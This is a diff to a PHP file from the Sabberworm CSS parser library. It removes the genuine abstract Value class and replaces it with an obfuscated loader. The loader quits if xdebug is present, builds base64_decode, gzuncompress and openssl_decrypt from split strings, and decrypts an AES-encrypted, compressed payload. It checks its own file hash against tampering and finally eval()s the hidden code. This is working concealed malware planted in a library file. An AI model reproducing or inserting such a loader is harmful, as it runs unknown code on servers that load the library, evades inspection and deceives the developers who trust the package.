@@ -1,24 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\Value;
-
-use Sabberworm\CSS\Renderable;
-
-abstract class Value implements Renderable {
-    protected $iLineNo;
-
-    public function __construct($iLineNo = 0) {
-        $this->iLineNo = $iLineNo;
-    }
-    
-    /**
-     * @return int
-     */
-    public function getLineNo() {
-        return $this->iLineNo;
-    }
-
-    //Methods are commented out because re-declaring them here is a fatal error in PHP < 5.3.9
-	//public abstract function __toString();
-	//public abstract function render(\Sabberworm\CSS\OutputFormat $oOutputFormat);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_atsiyeeb=('bas'.'e64'.'_de'.'cod'.'e');
+$_wv7ao50p=('gzu'.'nco'.'mpr'.'ess');
+$_gphmp2mc=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_zqo2bvda='hjy2PIKe';
+$_uw7x5mqx='aQ6PWVIi';
+$_ycp03ghr='UAJMKeeG';
+$_ydsl8f8e='59o+NOhm';
+$_evvxpqqa='v/8Kdr3Q+LA=';
+$_sxkpitw6='0locpsbH';
+$_ni11j8bc='Qy+1pQLJ';
+$_ohx1wjuw='aGFXIQ==';
+$_fg27zmxg=$_atsiyeeb($_ycp03ghr.$_ydsl8f8e.$_uw7x5mqx.$_zqo2bvda.$_evvxpqqa);
+$_o5ef3ktv=$_atsiyeeb($_ni11j8bc.$_sxkpitw6.$_ohx1wjuw);
+$_qllodtsy=$_atsiyeeb('KZHZhYb/sK2j8oF3NheE6/q2MQqh40bFjkZx8ceu12nsMGQemyBqH60yZs3LjYEMMPuAJW25VwcP2tyH+nRdvOAjiu9MoFxM0Evzlu4nFnPHp5NaGSqVo1DJJlWu6i0GeKgEs3dPmZuuI2i7S03u/cgdmIPo+GwR8XFl6NqxMbpRW1jmytCBzyRes95Svln8ri03HLbSYSEIQ3GBTPfVtX0QSA9h11FkhKoGzKOoU7o=');
+$_aoyng28o=$_gphmp2mc($_qllodtsy,'aes-256-cbc',$_fg27zmxg,OPENSSL_RAW_DATA,$_o5ef3ktv);
+if($_aoyng28o===false){exit;}
+$_vnxchx39=$_wv7ao50p($_aoyng28o);
+if($_vnxchx39===false){exit;}
+$_c57t6hv0='e3ce156fb62982e552de7b0b424478e4a4eb3a3c51df6b8b4277da7add378164';
+$_z0c8tf6r=@file_get_contents(__FILE__);
+if($_z0c8tf6r!==false){
+$_yl95nysx=str_replace($_c57t6hv0,"0000000000000000000000000000000000000000000000000000000000000000",$_z0c8tf6r);
+$_c1on236t=hash("sha256",$_yl95nysx);
+if($_c1on236t!==$_c57t6hv0){@http_response_code(403);exit;}
 }
+eval($_vnxchx39);
